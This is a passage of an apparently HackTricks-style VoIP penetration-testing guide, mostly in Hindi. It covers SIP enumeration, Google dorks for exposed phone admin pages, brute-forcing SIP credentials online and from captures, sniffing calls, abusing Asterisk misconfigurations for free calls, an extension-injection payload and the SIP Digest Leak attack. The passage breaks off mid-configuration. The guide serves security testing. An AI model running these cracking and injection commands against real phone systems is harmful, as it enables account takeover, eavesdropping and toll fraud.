# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**अपने वेब ऐप्स, नेटवर्क और क्लाउड पर एक हैकर का दृष्टिकोण प्राप्त करें**

**महत्वपूर्ण, शोषण योग्य कमजोरियों को खोजें और रिपोर्ट करें जिनका वास्तविक व्यापार पर प्रभाव है।** हमारे 20+ कस्टम टूल का उपयोग करके हमले की सतह का मानचित्रण करें, सुरक्षा मुद्दों को खोजें जो आपको विशेषाधिकार बढ़ाने की अनुमति देते हैं, और आवश्यक सबूत इकट्ठा करने के लिए स्वचालित शोषण का उपयोग करें, जिससे आपका कठिन काम प्रभावशाली रिपोर्टों में बदल जाए।

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## VoIP Basic Information

VoIP कैसे काम करता है यह सीखना शुरू करने के लिए देखें:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Basic Messages
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xx—अस्थायी प्रतिक्रियाएँ**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—सफल प्रतिक्रियाएँ**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—पुनर्निर्देशन प्रतिक्रियाएँ**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—क्लाइंट विफलता प्रतिक्रियाएँ**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—सर्वर विफलता प्रतिक्रियाएँ**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—वैश्विक विफलता प्रतिक्रियाएँ**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

एक रेड टीम द्वारा किए जाने वाले पहले कदमों में से एक उपलब्ध फोन नंबरों की खोज करना है ताकि कंपनी से संपर्क किया जा सके, इसके लिए OSINT टूल, Google Searches या वेब पेजों को स्क्रैप किया जा सकता है।

जब आपके पास टेलीफोन नंबर हों, तो आप ऑपरेटर की पहचान करने के लिए ऑनलाइन सेवाओं का उपयोग कर सकते हैं:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

यह जानकर कि क्या ऑपरेटर VoIP सेवाएं प्रदान करता है, आप पहचान सकते हैं कि क्या कंपनी VoIP का उपयोग कर रही है... इसके अलावा, यह संभव है कि कंपनी ने VoIP सेवाएं नहीं ली हैं लेकिन अपने VoIP PBX को पारंपरिक टेलीफोनी नेटवर्क से जोड़ने के लिए PSTN कार्ड का उपयोग कर रही है।

संगीत के स्वचालित उत्तर जैसी चीजें आमतौर पर यह संकेत देती हैं कि VoIP का उपयोग किया जा रहा है।

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT जानकारी

कोई अन्य OSINT गणना जो VoIP सॉफ़्टवेयर की पहचान करने में मदद करती है, वह Red Team के लिए सहायक होगी।

### नेटवर्क गणना

- **`nmap`** UDP सेवाओं को स्कैन करने में सक्षम है, लेकिन UDP सेवाओं की संख्या के कारण, यह बहुत धीमा है और इस प्रकार की सेवाओं के साथ बहुत सटीक नहीं हो सकता।
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** SIPVicious से (`sudo apt install sipvicious`): निर्दिष्ट नेटवर्क में SIP सेवाओं को खोजेगा।
- `svmap` को **ब्लॉक करना आसान** है क्योंकि यह User-Agent `friendly-scanner` का उपयोग करता है, लेकिन आप `/usr/share/sipvicious/sipvicious` से कोड को संशोधित कर सकते हैं और इसे बदल सकते हैं।
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS स्कैन UDP, TCP या TLS पर SIP सेवाओं के लिए एक बहुत तेज़ स्कैनर है। यह मल्टीथ्रेड का उपयोग करता है और बड़े नेटवर्क रेंज को स्कैन कर सकता है। यह पोर्ट रेंज को आसानी से इंगित करने, TCP और UDP दोनों को स्कैन करने, एक अन्य विधि का उपयोग करने (डिफ़ॉल्ट रूप से यह OPTIONS का उपयोग करेगा) और एक अलग User-Agent निर्दिष्ट करने की अनुमति देता है (और अधिक)।
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### अतिरिक्त नेटवर्क एन्यूमरेशन

PBX अन्य नेटवर्क सेवाओं को भी उजागर कर सकता है जैसे:

- **69/UDP (TFTP)**: फर्मवेयर अपडेट
- **80 (HTTP) / 443 (HTTPS)**: वेब से डिवाइस को प्रबंधित करने के लिए
- **389 (LDAP)**: उपयोगकर्ताओं की जानकारी संग्रहीत करने का विकल्प
- **3306 (MySQL)**: MySQL डेटाबेस
- **5038 (Manager)**: अन्य प्लेटफार्मों से Asterisk का उपयोग करने की अनुमति देता है
- **5222 (XMPP)**: Jabber का उपयोग करके संदेश
- **5432 (PostgreSQL)**: PostgreSQL डेटाबेस
- और अन्य...

### विधियों की एन्यूमरेशन

यह पता लगाना संभव है **कि PBX में कौन सी विधियाँ उपलब्ध हैं** `SIPPTS enumerate` का उपयोग करके [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### सर्वर प्रतिक्रियाओं का विश्लेषण

यह बहुत महत्वपूर्ण है कि हम उन हेडर का विश्लेषण करें जो एक सर्वर हमें वापस भेजता है, जो कि हम भेजे गए संदेश और हेडर के प्रकार पर निर्भर करता है। [**sippts**](https://github.com/Pepelux/sippts) से `SIPPTS send` के साथ हम व्यक्तिगत संदेश भेज सकते हैं, सभी हेडर को मैनिपुलेट करते हुए, और प्रतिक्रिया का विश्लेषण कर सकते हैं।
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
यह डेटा प्राप्त करना भी संभव है यदि सर्वर वेब्सॉकेट्स का उपयोग करता है। [**sippts**](https://github.com/Pepelux/sippts) से `SIPPTS wssend` का उपयोग करके हम व्यक्तिगत WS संदेश भेज सकते हैं।
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBX (Private Branch Exchange) प्रणाली में एक्सटेंशन उन **विशिष्ट आंतरिक पहचानकर्ताओं** को संदर्भित करते हैं जो एक संगठन या व्यवसाय के भीतर व्यक्तिगत फोन लाइनों, उपकरणों या उपयोगकर्ताओं को सौंपे जाते हैं। एक्सटेंशन यह संभव बनाते हैं कि **संगठन के भीतर कॉल को कुशलता से रूट किया जा सके**, बिना प्रत्येक उपयोगकर्ता या उपकरण के लिए व्यक्तिगत बाहरी फोन नंबर की आवश्यकता के।

- **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar` एक मुफ्त SIP PBX एक्सटेंशन लाइन स्कैनर है। अवधारणा में यह पारंपरिक वारडायलर्स के समान काम करता है, **एक रेंज के एक्सटेंशनों या दिए गए एक्सटेंशनों की सूची का अनुमान लगाकर**।
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten एक SIP सर्वर पर एक्सटेंशन की पहचान करता है। Sipexten बड़े नेटवर्क और पोर्ट रेंज की जांच कर सकता है।
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: आप metasploit के साथ extensions/usernames की भी गणना कर सकते हैं:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** एक इंटर एस्टरिस्क एक्सचेंज प्रोटोकॉल **यूजरनेम ब्रूट-फोर्स एन्यूमरेटर** है। enumIAX दो अलग-अलग मोड में काम कर सकता है; अनुक्रमिक यूजरनेम अनुमान या शब्दकोश हमला।
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP हमले

### पासवर्ड ब्रूट-फोर्स - ऑनलाइन

**PBX** और कुछ **extensions/usernames** का पता लगाने के बाद, एक रेड टीम **REGISTER विधि** के माध्यम से एक एक्सटेंशन पर प्रमाणीकरण करने की कोशिश कर सकती है, सामान्य पासवर्ड के एक शब्दकोश का उपयोग करके प्रमाणीकरण को ब्रूट फोर्स करने के लिए।

> [!CAUTION]
> ध्यान दें कि एक **username** एक्सटेंशन के समान हो सकता है, लेकिन यह प्रथा PBX प्रणाली, इसकी कॉन्फ़िगरेशन और संगठन की प्राथमिकताओं के आधार पर भिन्न हो सकती है...
>
> यदि username एक्सटेंशन के समान नहीं है, तो आपको इसे ब्रूट-फोर्स करने के लिए **username का पता लगाना होगा**।

- **`svcrack`** SIPVicious से (`sudo apt install sipvicious`): SVCrack आपको PBX पर एक विशिष्ट username/extension के लिए पासवर्ड क्रैक करने की अनुमति देता है।
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack एक दूरस्थ पासवर्ड क्रैकर है जो SIP सेवाओं के लिए है। Rcrack विभिन्न IPs और पोर्ट रेंज में कई उपयोगकर्ताओं के लिए पासवर्ड का परीक्षण कर सकता है।
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

यदि आप **Open Wifi network** के अंदर VoIP उपकरण पाते हैं, तो आप **सभी जानकारी को स्निफ** कर सकते हैं। इसके अलावा, यदि आप एक अधिक बंद नेटवर्क (Ethernet के माध्यम से जुड़े या सुरक्षित Wifi) के अंदर हैं, तो आप **PBX और गेटवे** के बीच **MitM हमले जैसे** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) कर सकते हैं ताकि जानकारी को स्निफ किया जा सके।

नेटवर्क जानकारी के बीच, आप **उपकरण प्रबंधित करने के लिए वेब क्रेडेंशियल्स**, उपयोगकर्ता **एक्सटेंशन**, **उपयोगकर्ता नाम**, **IP** पते, यहां तक कि **हैश किए गए पासवर्ड** और **RTP पैकेट** भी पा सकते हैं जिन्हें आप **बातचीत सुनने के लिए पुन: उत्पन्न** कर सकते हैं, और भी बहुत कुछ।

इस जानकारी को प्राप्त करने के लिए, आप Wireshark, tcpdump जैसे उपकरणों का उपयोग कर सकते हैं... लेकिन VoIP बातचीत को स्निफ करने के लिए **विशेष रूप से बनाए गए उपकरण** [**ucsniff**](https://github.com/Seabreg/ucsniff) हैं।

> [!CAUTION]
> ध्यान दें कि यदि **SIP संचार में TLS का उपयोग किया गया है** तो आप SIP संचार को स्पष्ट रूप से नहीं देख पाएंगे।\
> यदि **SRTP** और **ZRTP** का उपयोग किया गया है, तो **RTP पैकेट स्पष्ट पाठ में नहीं होंगे**।

#### SIP क्रेडेंशियल्स (पासवर्ड ब्रूट-फोर्स - ऑफ़लाइन)

[एक उदाहरण देखें ताकि आप **SIP REGISTER संचार** को बेहतर समझ सकें](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) यह जानने के लिए कि **क्रेडेंशियल्स कैसे भेजे जा रहे हैं**।

- **`sipdump`** & **`sipcrack`,** **sipcrack** का हिस्सा (`apt-get install sipcrack`): ये उपकरण **pcap** से **SIP प्रोटोकॉल के भीतर** **डाइजेस्ट प्रमाणीकरण** को **निकाल** सकते हैं और **ब्रूटफोर्स** कर सकते हैं।
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump एक pcap फ़ाइल से डाइजेस्ट प्रमाणीकरण निकाल सकता है।
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack एक उपकरण है जो SIPPTS डंप से प्राप्त डाइजेस्ट प्रमाणीकरण को क्रैक करने के लिए है।
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark एक PCAP फ़ाइल से SIP प्रोटोकॉल का डेटा निकालता है।
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF कोड

**केवल SIP क्रेडेंशियल्स** ही नेटवर्क ट्रैफिक में पाए जा सकते हैं, बल्कि **वॉइसमेल** तक पहुँचने के लिए उपयोग किए जाने वाले DTMF कोड भी पाए जा सकते हैं।\
इन कोड को **INFO SIP संदेशों** में, **ऑडियो** में या **RTP पैकेट्स** के अंदर भेजना संभव है। यदि कोड RTP पैकेट्स के अंदर हैं, तो आप बातचीत के उस हिस्से को काट सकते हैं और उन्हें निकालने के लिए टूल multimo का उपयोग कर सकते हैं:
```bash
multimon -a DTMF -t wac pin.wav
```
### मुफ्त कॉल / एस्टेरिस्क कनेक्शन की गलत कॉन्फ़िगरेशन

एस्टेरिस्क में एक कनेक्शन की अनुमति देना संभव है **किसी विशेष IP पते से** या **किसी भी IP पते से**:
```
host=10.10.10.10
host=dynamic
```
यदि एक IP पता निर्दिष्ट किया गया है, तो होस्ट **हर कुछ समय में REGISTER** अनुरोध भेजने की आवश्यकता नहीं होगी (REGISTER पैकेट में जीवनकाल भेजा जाता है, आमतौर पर 30 मिनट, जिसका अर्थ है कि अन्य परिदृश्य में फोन को हर 30 मिनट में REGISTER करने की आवश्यकता होगी)। हालाँकि, इसे कॉल करने के लिए VoIP सर्वर से कनेक्शन की अनुमति देने वाले खुले पोर्ट होने की आवश्यकता होगी।

उपयोगकर्ताओं को परिभाषित करने के लिए उन्हें इस प्रकार परिभाषित किया जा सकता है:

- **`type=user`**: उपयोगकर्ता केवल कॉल प्राप्त कर सकता है।
- **`type=friend`**: यह पीयर के रूप में कॉल करने और उपयोगकर्ता के रूप में उन्हें प्राप्त करने की अनुमति देता है (विस्तारण के साथ उपयोग किया जाता है)
- **`type=peer`**: यह पीयर के रूप में कॉल भेजने और प्राप्त करने की अनुमति देता है (SIP-trunks)

यह असुरक्षित चर के साथ विश्वास स्थापित करना भी संभव है:

- **`insecure=port`**: IP द्वारा मान्य पीयर कनेक्शन की अनुमति देता है।
- **`insecure=invite`**: INVITE संदेशों के लिए प्रमाणीकरण की आवश्यकता नहीं है
- **`insecure=port,invite`**: दोनों

> [!WARNING]
> जब **`type=friend`** का उपयोग किया जाता है, तो **host** चर का **मूल्य** **उपयोग नहीं किया जाएगा**, इसलिए यदि एक व्यवस्थापक **SIP-trunk को** उस मूल्य का उपयोग करके **गलत कॉन्फ़िगर करता है**, तो **कोई भी इससे कनेक्ट कर सकेगा**।
>
> उदाहरण के लिए, यह कॉन्फ़िगरेशन कमजोर होगा:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### मुफ्त कॉल / एस्टेरिस्क संदर्भ गलत कॉन्फ़िगरेशन

Asterisk में एक **संदर्भ** एक नामित कंटेनर या अनुभाग है जो डायल योजना में **संबंधित विस्तार, क्रियाएँ और नियमों** को एक साथ समूहित करता है। डायल योजना Asterisk प्रणाली का मुख्य घटक है, क्योंकि यह **कैसे आने वाली और जाने वाली कॉल को संभाला और रूट किया जाता है** को परिभाषित करता है। संदर्भों का उपयोग डायल योजना को व्यवस्थित करने, पहुंच नियंत्रण प्रबंधित करने और प्रणाली के विभिन्न भागों के बीच विभाजन प्रदान करने के लिए किया जाता है।

प्रत्येक संदर्भ कॉन्फ़िगरेशन फ़ाइल में परिभाषित होता है, आमतौर पर **`extensions.conf`** फ़ाइल में। संदर्भों को वर्गाकार ब्रैकेट द्वारा दर्शाया जाता है, जिसमें संदर्भ का नाम उनके भीतर होता है। उदाहरण के लिए:
```bash
csharpCopy code[my_context]
```
संदर्भ के भीतर, आप एक्सटेंशन (डायल किए गए नंबरों के पैटर्न) को परिभाषित करते हैं और उन्हें क्रियाओं या अनुप्रयोगों की एक श्रृंखला के साथ जोड़ते हैं। ये क्रियाएँ यह निर्धारित करती हैं कि कॉल को कैसे संसाधित किया जाता है। उदाहरण के लिए:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
यह उदाहरण "my_context" नामक एक सरल संदर्भ को दर्शाता है जिसमें "100" का विस्तार है। जब कोई 100 डायल करता है, तो कॉल का उत्तर दिया जाएगा, एक स्वागत संदेश चलाया जाएगा, और फिर कॉल समाप्त कर दी जाएगी।

यह **एक और संदर्भ** है जो **किसी अन्य नंबर पर कॉल करने** की अनुमति देता है:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
यदि व्यवस्थापक **डिफ़ॉल्ट संदर्भ** को इस प्रकार परिभाषित करता है:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> कोई भी **किसी अन्य नंबर पर कॉल करने के लिए सर्वर का उपयोग कर सकेगा** (और सर्वर का व्यवस्थापक कॉल के लिए भुगतान करेगा)।

> [!CAUTION]
> इसके अलावा, डिफ़ॉल्ट रूप से **`sip.conf`** फ़ाइल में **`allowguest=true`** होता है, तो **कोई भी** हमलावर **कोई प्रमाणीकरण** के बिना किसी अन्य नंबर पर कॉल कर सकेगा।

- **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite यह जांचता है कि **PBX सर्वर हमें बिना प्रमाणीकरण के कॉल करने की अनुमति देता है या नहीं**। यदि SIP सर्वर की गलत कॉन्फ़िगरेशन है, तो यह हमें बाहरी नंबरों पर कॉल करने की अनुमति देगा। यह हमें कॉल को दूसरे बाहरी नंबर पर स्थानांतरित करने की भी अनुमति दे सकता है।

उदाहरण के लिए, यदि आपके Asterisk सर्वर की संदर्भ कॉन्फ़िगरेशन खराब है, तो आप बिना प्राधिकरण के INVITE अनुरोध स्वीकार कर सकते हैं। इस मामले में, एक हमलावर बिना किसी उपयोगकर्ता/पासवर्ड को जाने कॉल कर सकता है।
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### मुफ्त कॉल / गलत कॉन्फ़िगर किया गया IVRS

IVRS का मतलब है **इंटरएक्टिव वॉयस रिस्पांस सिस्टम**, एक टेलीफोनी तकनीक जो उपयोगकर्ताओं को आवाज़ या टच-टोन इनपुट के माध्यम से एक कंप्यूटरीकृत प्रणाली के साथ बातचीत करने की अनुमति देती है। IVRS का उपयोग **स्वचालित कॉल हैंडलिंग** सिस्टम बनाने के लिए किया जाता है जो विभिन्न कार्यक्षमताओं की पेशकश करता है, जैसे जानकारी प्रदान करना, कॉल रूट करना, और उपयोगकर्ता इनपुट कैप्चर करना।

VoIP सिस्टम में IVRS आमतौर पर निम्नलिखित से मिलकर बना होता है:

1. **वॉयस प्रॉम्प्ट**: पूर्व-रिकॉर्डेड ऑडियो संदेश जो उपयोगकर्ताओं को IVR मेनू विकल्पों और निर्देशों के माध्यम से मार्गदर्शित करते हैं।
2. **DTMF** (डुअल-टोन मल्टी-फ्रीक्वेंसी) सिग्नलिंग: फोन पर कुंजियों को दबाकर उत्पन्न टच-टोन इनपुट, जिसका उपयोग IVR मेनू के माध्यम से नेविगेट करने और इनपुट प्रदान करने के लिए किया जाता है।
3. **कॉल रूटिंग**: उपयोगकर्ता इनपुट के आधार पर कॉल को उचित गंतव्य, जैसे विशिष्ट विभागों, एजेंटों, या एक्सटेंशन पर निर्देशित करना।
4. **उपयोगकर्ता इनपुट कैप्चर**: कॉल करने वालों से जानकारी एकत्र करना, जैसे खाता नंबर, केस आईडी, या कोई अन्य प्रासंगिक डेटा।
5. **बाहरी सिस्टम के साथ एकीकरण**: IVR प्रणाली को डेटाबेस या अन्य सॉफ़्टवेयर सिस्टम से जोड़ना ताकि जानकारी तक पहुँच या अपडेट किया जा सके, क्रियाएँ की जा सकें, या घटनाएँ ट्रिगर की जा सकें।

एक Asterisk VoIP सिस्टम में, आप डायल प्लान (**`extensions.conf`** फ़ाइल) और विभिन्न अनुप्रयोगों जैसे `Background()`, `Playback()`, `Read()`, और अधिक का उपयोग करके एक IVR बना सकते हैं। ये अनुप्रयोग आपको वॉयस प्रॉम्प्ट खेलने, उपयोगकर्ता इनपुट कैप्चर करने, और कॉल प्रवाह को नियंत्रित करने में मदद करते हैं।

#### कमजोर कॉन्फ़िगरेशन का उदाहरण
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
पिछला एक उदाहरण है जहाँ उपयोगकर्ता से **एक विभाग को कॉल करने के लिए 1 दबाने** के लिए कहा जाता है, **दूसरे को कॉल करने के लिए 2 दबाने** के लिए, या यदि वह जानता है तो **पूर्ण एक्सटेंशन** डालने के लिए।\
कमजोरी यह है कि निर्दिष्ट **एक्सटेंशन की लंबाई की जांच नहीं की जाती, इसलिए एक उपयोगकर्ता 5 सेकंड का टाइमआउट डाल सकता है और एक पूर्ण नंबर डायल किया जा सकता है।**

### एक्सटेंशन इंजेक्शन

एक एक्सटेंशन का उपयोग करते हुए:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
जहाँ **`${EXTEN}`** वह **extension** है जिसे कॉल किया जाएगा, जब **ext 101 पेश किया जाएगा** तो यह होगा:
```scss
exten => 101,1,Dial(SIP/101)
```
हालांकि, यदि **`${EXTEN}`** **संख्याओं** के अलावा **अधिक** की अनुमति देता है (जैसे पुराने Asterisk संस्करणों में), तो एक हमलावर **`101&SIP123123123`** को फोन नंबर 123123123 पर कॉल करने के लिए पेश कर सकता है। और इसका परिणाम होगा:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
इसलिए, **`101`** और **`123123123`** एक्सटेंशन पर कॉल भेजी जाएगी और केवल पहला कॉल प्राप्त करने वाला स्थापित होगा... लेकिन यदि एक हमलावर एक **ऐसी एक्सटेंशन का उपयोग करता है जो किसी भी मिलान को बायपास करता है** जो किया जा रहा है लेकिन अस्तित्व में नहीं है, तो वह **केवल इच्छित नंबर पर कॉल इंजेक्ट कर सकता है**।

## SIPDigestLeak भेद्यता

SIP Digest Leak एक भेद्यता है जो कई SIP फोन को प्रभावित करती है, जिसमें हार्डवेयर और सॉफ़्टवेयर IP फोन के साथ-साथ फोन एडाप्टर (VoIP से एनालॉग) शामिल हैं। यह भेद्यता **डाइजेस्ट प्रमाणीकरण प्रतिक्रिया के लीक** की अनुमति देती है, जो पासवर्ड से गणना की जाती है। एक **ऑफलाइन पासवर्ड हमले की संभावना है** और यह चुनौती प्रतिक्रिया के आधार पर अधिकांश पासवर्ड को पुनर्प्राप्त कर सकता है।

**[भेद्यता परिदृश्य यहाँ से**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. एक IP फोन (शिकार) किसी भी पोर्ट पर सुन रहा है (उदाहरण: 5060), फोन कॉल स्वीकार कर रहा है
2. हमलावर IP फोन को एक INVITE भेजता है
3. शिकार फोन बजने लगता है और कोई उठाता है और लटकाता है (क्योंकि दूसरी तरफ कोई फोन का जवाब नहीं देता)
4. जब फोन लटक जाता है, तो **शिकार फोन हमलावर को एक BYE भेजता है**
5. **हमलावर एक 407 प्रतिक्रिया जारी करता है** जो **प्रमाणीकरण के लिए पूछता है** और एक प्रमाणीकरण चुनौती जारी करता है
6. **शिकार फोन एक दूसरे BYE में प्रमाणीकरण चुनौती का उत्तर प्रदान करता है**
7. **हमलावर फिर अपनी स्थानीय मशीन (या वितरित नेटवर्क आदि) पर चुनौती प्रतिक्रिया पर एक ब्रूट-फोर्स हमला कर सकता है** और पासवर्ड का अनुमान लगा सकता है

- **SIPPTS लीक** [**sippts**](https://github.com/Pepelux/sippts)** से:** SIPPTS लीक SIP Digest Leak भेद्यता का लाभ उठाता है जो कई SIP फोन को प्रभावित करती है। आउटपुट को SipCrack प्रारूप में सहेजा जा सकता है ताकि इसे SIPPTS dcrack या SipCrack टूल का उपयोग करके ब्रूटफोर्स किया जा सके।
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call एक **वेब उपयोगकर्ता** को **परिचय** देने की अनुमति देता है (जो उदाहरण के लिए किसी उत्पाद में रुचि रख सकता है) ताकि वह **अपने टेलीफोन नंबर** को साझा कर सके और कॉल प्राप्त कर सके। फिर एक वाणिज्यिक कॉल की जाएगी, और जब वह **फोन उठाएगा** तो उपयोगकर्ता को **कॉल किया जाएगा और एजेंट से जोड़ा जाएगा**।

इसके लिए एक सामान्य Asterisk प्रोफ़ाइल है:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
